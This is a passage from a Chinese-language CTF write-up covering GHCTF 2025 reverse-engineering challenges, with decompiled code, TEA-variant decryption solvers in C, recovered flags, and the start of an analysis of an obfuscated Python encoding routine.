&gt;&gt; 5) ^ (16 * a1))));</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 += <span class="number">1719109785</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        a2 -= ((key[(v3 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + v3) ^ (a1 + ((a1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * a1))));</span><br><span class="line">        v3 -= <span class="number">1719109785</span>;</span><br><span class="line">        a1 -= (key[v3 &amp; <span class="number">3</span>] + v3) ^ (a2 + ((a2 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * a2)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x %x\n&quot;</span>, a1, a2);</span><br><span class="line">    middle[<span class="number">0</span>] = a1;</span><br><span class="line">    middle[<span class="number">1</span>] = a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flag[<span class="number">6</span>] = &#123;</span><br><span class="line">    <span class="number">0xA6975621</span>, <span class="number">0xDEC4D51A</span>, <span class="number">0x4D829CA4</span>, <span class="number">0x56C845D1</span>, <span class="number">0x5C96B4A7</span>, <span class="number">0x2087494D</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[]= &#123;</span><br><span class="line">    <span class="number">0x756C6544</span>, <span class="number">0x61426578</span>, <span class="number">0x00007469</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *middle;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        middle = &amp;flag[i];</span><br><span class="line">        detea(middle, key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">24</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">//char类型转换</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">6</span>; k++) &#123;</span><br><span class="line">        a[k * <span class="number">4</span>] = (flag[k]);</span><br><span class="line">        a[k * <span class="number">4</span> + <span class="number">1</span>] = (flag[k] &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        a[k * <span class="number">4</span> + <span class="number">2</span>] = (flag[k] &gt;&gt; <span class="number">16</span>);</span><br><span class="line">        a[k * <span class="number">4</span> + <span class="number">3</span>] = (flag[k] &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//DeluxeBait</span></span><br><span class="line"><span class="comment">//NSSCTF&#123;Wh@t_@_b1g_F1sh&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/.io//tool\blog\source\postpic\ghctf2025\2.png" loading="lazy">彩蛋，后面hook了MessageboxA</p><h2 id="LockedSecret"><a href="#LockedSecret" class="headerlink" title="LockedSecret"></a>LockedSecret</h2><p><img src="/.io//tool\blog\source\postpic\ghctf2025\3.png" loading="lazy"></p><p>upx改壳+32，而且和一般壳不太一样，我选择和ida配合手脱</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-108h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-108h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-108h]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">256</span>]; <span class="comment">// [esp+4h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">  sub_6D1050(Format, v4);</span><br><span class="line">  sub_6D10C0(<span class="string">&quot;%32s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_6D1050(aWrongLength, v5);</span><br><span class="line">    system(Command);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_6D1100();</span><br><span class="line">  sub_6D1190((<span class="type">int</span> *)Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( unk_6D4060[i] != Str[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_6D1050(aWrong, i);</span><br><span class="line">      system(aPause_0);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_6D1050(aRight, i);</span><br><span class="line">  system(aPause_1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个字写函数是造盒，用于初始化第二个函数里的key，第二个函数确实难看，提示说在Ghidra中查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">FUN_006d1190</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  <span class="type">bool</span> bVar3;</span><br><span class="line">  uint local_34;</span><br><span class="line">  <span class="type">int</span> local_30;</span><br><span class="line">  <span class="type">int</span> local_2c;</span><br><span class="line">  <span class="type">int</span> local_28;</span><br><span class="line">  <span class="type">int</span> local_24;</span><br><span class="line">  <span class="type">int</span> local_20;</span><br><span class="line">  byte local_1c [<span class="number">16</span>];</span><br><span class="line">  <span class="type">char</span> local_c;</span><br><span class="line">  uint local_8;</span><br><span class="line">  </span><br><span class="line">  local_8 = DAT_006d4000 ^ (uint)&amp;stack0xfffffffc;</span><br><span class="line">  local_1c._0_4_ = s_IamTheKeyYouKnow_006d3120._0_4_;</span><br><span class="line">  local_1c._4_4_ = s_IamTheKeyYouKnow_006d3120._4_4_;</span><br><span class="line">  local_1c._8_4_ = s_IamTheKeyYouKnow_006d3120._8_4_;</span><br><span class="line">  local_1c._12_4_ = s_IamTheKeyYouKnow_006d3120._12_4_;</span><br><span class="line">  local_c = s_IamTheKeyYouKnow_006d3120[<span class="number">0x10</span>];</span><br><span class="line">  <span class="keyword">for</span> (local_34 = <span class="number">0</span>; (<span class="type">int</span>)local_34 &lt; <span class="number">0xf</span>; local_34 = local_34 + <span class="number">1</span>) &#123;</span><br><span class="line">    uVar1 = local_34 &amp; <span class="number">0x80000007</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">int</span>)uVar1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      uVar1 = (uVar1 - <span class="number">1</span> | <span class="number">0xfffffff8</span>) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    local_1c[local_34] = local_1c[local_34] ^ (byte)*(undefined4 *)(&amp;DAT_006d43d8 + uVar1 * <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  local_2c = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_24 = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;local_2c,local_1c,<span class="number">0x10</span>);</span><br><span class="line">  local_30 = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uVar1 = *(uint *)(param_1 + <span class="number">4</span> + (<span class="number">4</span> - local_30) * <span class="number">8</span>);</span><br><span class="line">    uVar2 = (uVar1 * <span class="number">0x10</span> + local_2c ^ uVar1 + <span class="number">0x5e2377ff</span> ^ (uVar1 &gt;&gt; <span class="number">5</span>) + local_28) +</span><br><span class="line">            *(<span class="type">int</span> *)(param_1 + (<span class="number">4</span> - local_30) * <span class="number">8</span>);</span><br><span class="line">    uVar1 = (uVar2 * <span class="number">0x10</span> + local_24 ^ uVar2 + <span class="number">0x5e2377ff</span> ^ (uVar2 &gt;&gt; <span class="number">5</span>) + local_20) + uVar1;</span><br><span class="line">    uVar2 = (uVar1 * <span class="number">0x10</span> + local_2c ^ uVar1 + <span class="number">0xbc46effe</span> ^ (uVar1 &gt;&gt; <span class="number">5</span>) + local_28) + uVar2;</span><br><span class="line">    uVar1 = (uVar2 * <span class="number">0x10</span> + local_24 ^ uVar2 + <span class="number">0xbc46effe</span> ^ (uVar2 &gt;&gt; <span class="number">5</span>) + local_20) + uVar1;</span><br><span class="line">    uVar2 = (uVar1 * <span class="number">0x10</span> + local_2c ^ uVar1 + <span class="number">0x1a6a67fd</span> ^ (uVar1 &gt;&gt; <span class="number">5</span>) + local_28) + uVar2;</span><br><span class="line">    uVar1 = (uVar2 * <span class="number">0x10</span> + local_24 ^ uVar2 + <span class="number">0x1a6a67fd</span> ^ (uVar2 &gt;&gt; <span class="number">5</span>) + local_20) + uVar1;</span><br><span class="line">    uVar2 = (uVar1 * <span class="number">0x10</span> + local_2c ^ uVar1 + <span class="number">0x788ddffc</span> ^ (uVar1 &gt;&gt; <span class="number">5</span>) + local_28) + uVar2;</span><br><span class="line">    uVar1 = (uVar2 * <span class="number">0x10</span> + local_24 ^ uVar2 + <span class="number">0x788ddffc</span> ^ (uVar2 &gt;&gt; <span class="number">5</span>) + local_20) + uVar1;</span><br><span class="line">    uVar2 = (uVar1 * <span class="number">0x10</span> + local_2c ^ uVar1 + <span class="number">0xd6b157fb</span> ^ (uVar1 &gt;&gt; <span class="number">5</span>) + local_28) + uVar2;</span><br><span class="line">    uVar1 = (uVar2 * <span class="number">0x10</span> + local_24 ^ uVar2 + <span class="number">0xd6b157fb</span> ^ (uVar2 &gt;&gt; <span class="number">5</span>) + local_20) + uVar1;</span><br><span class="line">    uVar2 = (uVar1 * <span class="number">0x10</span> + local_2c ^ uVar1 + <span class="number">0x34d4cffa</span> ^ (uVar1 &gt;&gt; <span class="number">5</span>) + local_28) + uVar2;</span><br><span class="line">    uVar1 = (uVar2 * <span class="number">0x10</span> + local_24 ^ uVar2 + <span class="number">0x34d4cffa</span> ^ (uVar2 &gt;&gt; <span class="number">5</span>) + local_20) + uVar1;</span><br><span class="line">    uVar2 = (uVar1 * <span class="number">0x10</span> + local_2c ^ uVar1 + <span class="number">0x92f847f9</span> ^ (uVar1 &gt;&gt; <span class="number">5</span>) + local_28) + uVar2;</span><br><span class="line">    uVar1 = (uVar2 * <span class="number">0x10</span> + local_24 ^ uVar2 + <span class="number">0x92f847f9</span> ^ (uVar2 &gt;&gt; <span class="number">5</span>) + local_20) + uVar1;</span><br><span class="line">    uVar2 = (uVar1 * <span class="number">0x10</span> + local_2c ^ uVar1 + <span class="number">0xf11bbff8</span> ^ (uVar1 &gt;&gt; <span class="number">5</span>) + local_28) + uVar2;</span><br><span class="line">    *(uint *)(param_1 + (<span class="number">4</span> - local_30) * <span class="number">8</span>) = uVar2 ^ <span class="number">0xf</span>;</span><br><span class="line">    *(uint *)(param_1 + <span class="number">4</span> + (<span class="number">4</span> - local_30) * <span class="number">8</span>) =</span><br><span class="line">         (uVar2 * <span class="number">0x10</span> + local_24 ^ uVar2 + <span class="number">0xf11bbff8</span> ^ (uVar2 &gt;&gt; <span class="number">5</span>) + local_20) + uVar1 ^ <span class="number">0xf</span>;</span><br><span class="line">    bVar3 = local_30 != <span class="number">0</span>;</span><br><span class="line">    local_30 = local_30 + <span class="number">-1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (bVar3);</span><br><span class="line">  FUN_006d173b(local_8 ^ (uint)&amp;stack0xfffffffc);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一下就很好看了，是tea，常数是在模拟+&#x3D;delta，key的实现动调看，dump下来是0x423DF72D, 0x05F59A01, 0x633FCF1D, 0x77D19122</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">detea</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* mi, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> a1, a2;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    a1 = mi[<span class="number">0</span>]^<span class="number">0xf</span>;</span><br><span class="line">    a2 = mi[<span class="number">1</span>]^<span class="number">0xf</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num += <span class="number">0x5e2377ff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num=%x\n&quot;</span>, num);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a2 -= (a1 * <span class="number">16</span> + key[<span class="number">2</span>] ^ a1 + num ^ (a1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">        a1 -= (a2 * <span class="number">16</span> + key[<span class="number">0</span>] ^ a2 + num ^ (a2 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">        num -= <span class="number">0x5e2377ff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; 8; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    num += 0x5e2377ff;</span></span><br><span class="line">    <span class="comment">//    printf(&quot;%x %x\n&quot;, a1, a2);</span></span><br><span class="line">    <span class="comment">//    a1 += (a2 * 16 + key[0] ^ a2 + num ^ (a2 &gt;&gt; 5) + key[1]);</span></span><br><span class="line">    <span class="comment">//    a2 += (a1 * 16 + key[2] ^ a1 + num ^ (a1 &gt;&gt; 5) + key[3]);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x %x\n&quot;</span>, a1, a2);</span><br><span class="line">    mi[<span class="number">0</span>] = a1;</span><br><span class="line">    mi[<span class="number">1</span>] = a2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[] = &#123; <span class="number">0x423DF72D</span>, <span class="number">0x05F59A01</span>, <span class="number">0x633FCF1D</span>, <span class="number">0x77D19122</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> input[] = &#123;</span><br><span class="line">        <span class="number">0x031E45DC</span>, <span class="number">0x2776E989</span>, <span class="number">0x01234847</span>, <span class="number">0x64CED270</span>, <span class="number">0x33467FDA</span>, <span class="number">0xA34903B1</span>, <span class="number">0x2CD10027</span>, <span class="number">0x75BDB337</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* middle;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        middle = &amp;input[i];</span><br><span class="line">        detea(middle, key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">33</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">//char类型转换</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++) &#123;</span><br><span class="line">        a[k * <span class="number">4</span>] = (input[k]);</span><br><span class="line">        a[k * <span class="number">4</span> + <span class="number">1</span>] = (input[k] &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        a[k * <span class="number">4</span> + <span class="number">2</span>] = (input[k] &gt;&gt; <span class="number">16</span>);</span><br><span class="line">        a[k * <span class="number">4</span> + <span class="number">3</span>] = (input[k] &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, a);</span><br><span class="line">    <span class="comment">//NSSCTF&#123;!!!Y0u_g3t_th3_s3cr3t!!!&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Mio？Ryo？Soyo？"><a href="#Mio？Ryo？Soyo？" class="headerlink" title="Mio？Ryo？Soyo？"></a>Mio？Ryo？Soyo？</h2><p>python文件，解密出来是引用自己的库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">R85</span>:</span><br><span class="line">    Mbox = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(Miiooooooooo) <span class="keyword">for</span> Miiooooooooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">118</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">M</span>(<span class="params">M1: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        M5 = <span class="string">&quot;&quot;</span></span><br><span class="line">        M2 = (<span class="number">4</span> - <span class="built_in">len</span>(M1) % <span class="number">4</span>) % <span class="number">4</span></span><br><span class="line">        M1 += <span class="string">b&#x27;\x00&#x27;</span> * M2</span><br><span class="line">        <span class="keyword">for</span> M7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(M1), <span class="number">4</span>):</span><br><span class="line">            M6 = M1[M7[:M7 + <span class="number">4</span>]]</span><br><span class="line">            M4 = <span class="built_in">int</span>.from_bytes(M6, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">            M3 = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                M3 = R85.Mbox[M4 % <span class="number">85</span>] + M3</span><br><span class="line">                M4 //= <span class="number">85</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                M5 += M3</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> M2:</span><br><span class="line">                M5 = M5[<span class="literal">None</span>[:-M2]]</span><br><span class="line">            <span class="keyword">return</span> M5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">R45</span>:</span><br><span class="line">    Rbox = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(RRRRouto) <span class="keyword">for</span> RRRRouto <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">R</span>(<span class="params">Rin: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        Rout = []</span><br><span class="line">        Ri = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> Ri &lt; <span class="built_in">len</span>(Rin):</span><br><span class="line">            <span class="keyword">if</span> Ri + <span class="number">1</span> &lt; <span class="built_in">len</span>(Rin):</span><br><span class="line">                Rmi = Rin[Ri] &lt;&lt; <span class="number">8</span> | Rin[Ri + <span class="number">1</span>]</span><br><span class="line">                Rout.append(R45.Rbox[Rmi % <span class="number">45</span>])</span><br><span class="line">                Rmi //= <span class="number">45</span></span><br><span class="line">                Rout.append(R45.Rbox[Rmi % <span class="number">45</span>])</span><br><span class="line">                Rmi //= <span class="number">45</span></span><br><span class="line">                Rout.append(R45.Rbox[Rmi])</span><br><span class="line">                Ri += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Rmi = Rin[Ri]</span><br><span class="line">                Rout.append(R45.Rbox[Rmi % <span class="number">45</span>])</span><br><span class="line">                Rmi //= <span class="number">45</span></span><br><span class="line">                Rout.append(R45.Rbox[Rmi])</span><br><span class="line">                Ri += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(Rout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">S</span>(<span class="params">S2, num</span>):</span><br><span class="line">    Sre = []</span><br><span class="line">    <span class="keyword">for</span> S1 <span class="keyword">in</span> S2:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> &lt;= S1 &lt;= <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            S3 = (<span class="built_in">ord</span>(S1) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + num) % <span class="number">26</span></span><br><span class="line">            Sre.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + S3))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;0&quot;</span> &lt;= S1 &lt;= <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            S3 = (<span class="built_in">ord</span>(S1) - <span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) - num) % <span class="number">10</span></span><br><span class="line">            Sre.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) + S3))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Sre.append(S1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(Sre)</span><br><span class="line"></span><br><span class="line">sssssssssssss = <span class="built_in">bytes</span>([<span class="number">57</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">114</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">78</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">59</span>, </span><br><span class="line"> <span class="number">95</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">122</span>, <span class="number">54</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">34</span>, <span class="number">109</span>, <span class="number">106</span>, <span 